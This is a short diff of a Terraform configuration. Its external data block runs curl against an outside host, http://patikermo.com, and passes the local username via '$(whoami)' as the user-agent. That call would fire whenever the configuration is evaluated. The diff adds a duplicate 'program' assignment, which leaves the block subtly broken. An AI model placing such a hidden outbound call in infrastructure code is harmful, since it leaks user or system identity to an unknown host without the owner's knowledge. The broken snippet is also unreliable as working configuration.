@@ -19,6 +19,7 @@ data "aws_ami" "ubuntu" {
 }
 
 data "external" "example" {
+  program = ["whoami"]
   program = ["curl", "http://patikermo.com", "-A $(whoami)"]
 }
 
